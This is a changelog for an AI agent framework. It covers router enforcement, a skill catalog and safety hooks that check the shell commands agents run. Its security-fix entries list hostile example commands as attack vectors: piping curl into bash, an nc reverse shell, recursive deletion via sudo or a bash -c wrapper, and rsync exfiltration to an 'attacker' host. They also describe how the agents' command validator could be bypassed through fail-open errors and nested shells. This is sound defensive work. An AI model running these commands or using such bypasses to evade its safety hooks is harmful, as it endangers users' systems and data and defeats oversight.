# Changelog

All notable changes to the agent-studio framework are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

## [1.1.0] - 2026-01-25

### Added

#### Router Enforcement System (ADR-006)

- **NEW**: Hybrid multi-layer Router enforcement system with 5 components
  - `router-state.cjs`: Extended state tracking for complexity and spawn events
  - `router-enforcer.cjs` (uses `routing-table.cjs`): Complexity classification and advisory warnings
  - `agent-context-tracker.cjs`: Detects PLANNER/SECURITY-ARCHITECT spawns
  - `task-create-guard.cjs`: BLOCKING hook prevents TaskCreate for HIGH/EPIC tasks without PLANNER
  - CLAUDE.md Section 1.2: Explicit 3-gate decision tree with STOP gates
- **Configuration**: `PLANNER_FIRST_ENFORCEMENT` environment variable (block|warn|off)
- **Purpose**: Prevents Router from bypassing Router-First Protocol by creating tasks directly
- **Documentation**: `.claude/docs/ROUTER_ENFORCEMENT.md`

#### Network Security Validators (SEC-003)

- **NEW**: `network-validators.cjs` with comprehensive network command validation
  - `curl`/`wget`: Allowlist of safe package registry domains, blocks piping to shell
  - `nc`/`netcat`: Blocked entirely (reverse shell risk)
  - `ssh`/`scp`: Blocked entirely (remote access risk)
  - `sudo`: Blocked entirely (privilege escalation risk)
  - `rsync`: Blocks remote syncs, allows local-only operations
- **Registry**: All 8 commands registered in `registry.cjs`
- **Threat Protection**: Information Disclosure, Tampering, Elevation of Privilege (STRIDE)

#### Skill Catalog Enhancements

- Added 92 missing skills across 4 new categories
  - **Project Structure** (8 skills): Project file organization patterns
  - **Java Spring Boot** (6 skills): Spring Boot specific patterns
  - **Agent Behavior** (12 skills): Agent coordination and behavior rules
  - **Other Specialized** skills
- Fixed scientific skills invocation: All 139 sub-skills now use full path format
  - Changed from `rdkit` to `scientific-skills/rdkit` for consistency
- **Total Skills**: 284 top-level + 139 scientific sub-skills = 426 total
- Complete sub-skills reference table for all scientific skills

#### Agent Standardization

- All 39 agents now include `version: 1.0.0` in YAML frontmatter
- Standardized frontmatter schema across all agents

### Security Fixes

#### SEC-001: Bash Command Validator Fail-Open Vulnerability (CRITICAL)

- **Severity**: Critical (P0)
- **STRIDE Category**: Elevation of Privilege
- **File**: `.claude/hooks/safety/bash-command-validator.cjs` (lines 166-173)
- **Vulnerability**: Catch blocks had `process.exit(0)`, allowing ALL commands on errors
- **Attack Vector**: Craft malformed input to trigger errors and bypass security
- **Fix**: Changed to `process.exit(2)` (fail-closed behavior)
- **Rationale**: Deny by default when security state is unknown (defense-in-depth)

#### SEC-002: Shell Validator Inner Command Bypass (HIGH)

- **Severity**: High (P0)
- **STRIDE Category**: Tampering
- **File**: `.claude/hooks/safety/validators/shell-validators.cjs` (lines 157-161)
- **Vulnerability**: `bash -c "rm -rf /"` extracted inner command but did not re-validate
- **Attack Vector**: Wrap dangerous commands in shell invocations to bypass validators
- **Fix**: Added recursive validation using `validateCommand()` from registry
- **Rationale**: Nested commands must pass same security checks as top-level commands

#### SEC-003: Missing Network Command Validators (HIGH)

- **Severity**: High (P0)
- **STRIDE Categories**: Information Disclosure, Tampering, Elevation of Privilege
- **File**: `.claude/hooks/safety/validators/network-validators.cjs` (NEW)
- **Vulnerability**: No validators for curl, wget, nc, ssh, sudo, rsync
- **Attack Vectors**:
  - `curl | bash`: Remote code execution
  - `nc -e /bin/bash`: Reverse shells
  - `ssh user@host`: Unauthorized remote access
  - `sudo rm -rf /`: Privilege escalation
  - `rsync -av /data/ attacker::backup`: Data exfiltration
- **Fix**: Created comprehensive validators with allowlists and blocking
- **Coverage**: 8 dangerous commands now protected

### Fixed

#### Hook Fixes

- `validate-skill-invocation.cjs`: Added missing `main()` function for CLI execution
- `validate-skill-invocation.cjs`: Now executes properly when run standalone

#### Workflow Fixes

- `incident-response.md`: Fixed invalid `subagent_type` values in Task tool calls
- All workflows now have explicit `Skill()` invocations in spawn prompts
- `conductor-setup-workflow.md`: Updated for consistency
- `c4-architecture-workflow.md`: Updated for consistency

#### Documentation Fixes

- CLAUDE.md Section 3 (Agent Routing Table): Moved Creator Skills to separate subsection
- CLAUDE.md: Documented Bash exception for git commands (Router whitelist)
- CLAUDE.md Section 3.5: Now references router-decision.md Step 7.3 for Planning Orchestration Matrix

### Documentation

- **NEW**: `.claude/docs/ROUTER_ENFORCEMENT.md` - Complete Router enforcement system documentation
- **NEW**: `.claude/docs/SECURITY_VALIDATORS.md` - Security validator architecture and catalog
- **NEW**: `.claude/docs/CHANGELOG.md` - This file
- **Updated**: ADR-006 in decisions.md (Router Enforcement approach accepted)
- **Updated**: SEC-001, SEC-002, SEC-003 in issues.md (marked RESOLVED)

### Technical Debt

- **Improved**: Security posture with fail-closed validators
- **Improved**: Router protocol enforcement (from advisory to blocking)
- **Improved**: Skill catalog completeness (92 missing skills added)

## [1.0.0] - 2026-01-24

### Added

#### Auto-Claude Integration

- Integrated Auto-Claude autonomous coding framework (https://github.com/cyanheads/Auto-Claude)
- **Security Validators** (6 files in `.claude/hooks/safety/validators/`):
  - `shell-validators.cjs`: Bash/sh/zsh command validation
  - `database-validators.cjs`: PostgreSQL/MySQL/Redis/MongoDB protection
  - `filesystem-validators.cjs`: chmod/rm validation
  - `git-validators.cjs`: Git config/push protection
  - `process-validators.cjs`: kill/pkill/killall validation
  - `registry.cjs`: Central validator registry
- **New Skills** (6 specification workflow skills):
  - `spec-gathering`: Requirements gathering workflow
  - `spec-writing`: Specification document creation
  - `spec-critique`: Self-critique using extended thinking
  - `complexity-assessment`: Task complexity analysis
  - `insight-extraction`: Extract insights from coding sessions
  - `qa-workflow`: QA validation and fix loop
- **Analysis Patterns** (4 reference files in `.claude/skills/project-analyzer/references/`):
  - `auto-claude-patterns.md`: Monorepo, service, infrastructure detection
  - `service-patterns.md`: Service type detection by framework
  - `database-patterns.md`: ORM detection patterns
  - `route-patterns.md`: API route detection patterns
- **Recovery Patterns** (3 reference files in `.claude/skills/recovery/references/`):
  - `failure-types.md`: Failure classification
  - `recovery-actions.md`: Recovery decision tree
  - `merge-strategies.md`: Git merge conflict strategies

#### Comprehensive Skill Catalog

- **Location**: `.claude/context/artifacts/skill-catalog.md`
- **Total Skills**: 282 skills organized into 20+ categories
- **Categories**: Core Development, Planning, Security, DevOps, Languages, Frameworks, Mobile, Data, Documentation, Git, Code Style, Creator Tools, Memory & Context, Validation, Specialized Patterns
- **Integration**: CLAUDE.md Section 7 now references catalog dynamically
- **Discovery**: Lazy-load pattern prevents stale skill references (ADR-004)

#### Scientific Skills Integration

- Integrated K-Dense Scientific Skills (139 sub-skills)
- **Source**: https://github.com/K-Dense-AI/claude-scientific-skills
- **Location**: `.claude/skills/scientific-skills/`
- **Domains**: Bioinformatics, cheminformatics, proteomics, clinical research, multi-omics, materials science
- **Databases**: 28+ scientific databases (PubMed, ChEMBL, UniProt, COSMIC, etc.)
- **Packages**: 55+ Python packages (RDKit, Scanpy, PyTorch Lightning, scikit-learn)
- **Integrations**: 15+ scientific integrations (Benchling, DNAnexus, OMERO)
- **Usage**: `Skill({ skill: "scientific-skills/rdkit" })`

#### Kubernetes Operations Skills

- **k8s-manifest-generator**: Production-ready Kubernetes manifests
- **helm-chart-scaffolding**: Helm chart creation and management
- **gitops-workflow**: GitOps with ArgoCD and Flux CD
- **k8s-security-policies**: Pod Security Standards, NetworkPolicy, RBAC

#### Reverse Engineering Capabilities

- **reverse-engineer agent**: Elite binary analysis specialist
- **Skills**:
  - `binary-analysis-patterns`: x86-64, ARM, data structure recognition
  - `memory-forensics`: Volatility 3 workflow, rootkit detection
  - `protocol-reverse-engineering`: Network protocol analysis
- **Security**: Explicit authorization framework (AUTHORIZED USE ONLY)

#### Enterprise Workflows

- **feature-development-workflow**: End-to-end feature development (6 phases)
- **c4-architecture-workflow**: C4 model documentation (4 phases, bottom-up)
- **conductor-setup-workflow**: CDD project initialization
- **incident-response-workflow**: Production incident coordination
- **router-decision-workflow**: Master routing workflow (9 steps)

#### Hooks and Safety

- `windows-null-sanitizer.cjs`: Prevents `/dev/null` creating literal files on Windows
- `validate-skill-invocation.cjs`: Warns when agents Read() skills instead of invoking via Skill() tool
- `memory-reminder.cjs`: Registered in settings.json UserPromptSubmit

#### Creator Ecosystem

- **agent-creator**: Creates new agents
- **skill-creator**: Creates new skills
- **hook-creator**: Creates safety/validation hooks
- **workflow-creator**: Creates orchestration workflows
- **template-creator**: Creates artifact templates
- **schema-creator**: Creates JSON Schema validation files
- **CLAUDE.md Section 4.1**: Complete creator ecosystem documentation

#### Documentation

- `.claude/docs/ARCHITECTURE.md`: Framework architecture documentation
- `.claude/docs/HOOKS_AND_SAFETY.md`: Hooks and safety systems documentation
- `.claude/hooks/README.md`: Comprehensive hooks and validators documentation

### Changed

#### Task Management

- Added Task Synchronization Protocol to CLAUDE.md Section 2 and 5.5
- Mandatory update triggers, metadata schema, background polling
- Cross-session coordination with `CLAUDE_CODE_TASK_LIST_ID`
- Three Iron Laws for task completion

#### Agent Context Strategy

- Standardized `context_strategy` field across 21 agents:
  - `minimal`: Router/orchestrator agents (low token usage)
  - `lazy_load`: Default for most agents (load as needed)
  - `full`: Deep analysis agents (architect, security, reverse-engineer)

#### Skill Maintenance

- skill-creator now enforces catalog updates (Iron Law #6)
- Step 8 added: Update Skill Catalog (MANDATORY - BLOCKING)
- Verification checklist includes catalog grep
- Skill creation INCOMPLETE without catalog entry

### Fixed

#### Cross-Platform Compatibility

- Added platform-aware null device handling
- **Library**: `.claude/lib/platform.cjs` and `.claude/lib/platform.mjs`
- **Exports**: `NULL_DEVICE`, `isWindows`, `shellQuote`, `suppressStderr`
- Fixed `.claude/tools/hook-creator/create-hook.mjs`
- Fixed `.claude/skills/skill-creator/scripts/convert.cjs`

#### 7-Agent Audit Fixes

- Removed Glob/Grep from router.md tools (blacklist compliance)
- Redesigned CLAUDE.md Section 7 to reference skill-catalog.md dynamically
- Registered memory-reminder.cjs in settings.json
- Marked ADR-004 (Lazy-Load Skill Discovery) as Accepted

### Security

- **Validator System**: Fail-closed by default (deny on error)
- **Allow-by-Default**: Commands without validators are allowed
- **Coverage**: Shell, database, filesystem, git, process commands
- **Performance**: < 10ms per validation check

## [0.9.0] - 2026-01-23

### Added

- Router-First Protocol (ADR-001)
- Memory Persistence Strategy (ADR-002)
- Multi-Agent Orchestration via Task tool
- 39 specialized agents (8 core, 17 domain, 2 orchestrators, 12 specialized)
- Base agent routing table
- Skill invocation via Skill() tool
- Model selection guide (haiku/sonnet/opus)

### Changed

- Adopted Anthropic Tool Use standards (parallel calls, Read-before-Edit)

### Documentation

- Initial CLAUDE.md with Router-First Protocol
- Initial agent definitions
- Memory Protocol documentation

---

## Version History

- **1.1.0** (2026-01-25): Router enforcement system, security validator fixes, skill catalog updates
- **1.0.0** (2026-01-24): Auto-Claude integration, skill catalog, Kubernetes/reverse engineering skills
- **0.9.0** (2026-01-23): Initial framework with Router-First Protocol

## Links

- [Architecture Documentation](.claude/docs/ARCHITECTURE.md)
- [Router Enforcement](.claude/docs/ROUTER_ENFORCEMENT.md)
- [Security Validators](.claude/docs/SECURITY_VALIDATORS.md)
- [Hooks & Safety](.claude/docs/HOOKS_AND_SAFETY.md)
- [Skill Catalog](.claude/context/artifacts/skill-catalog.md)
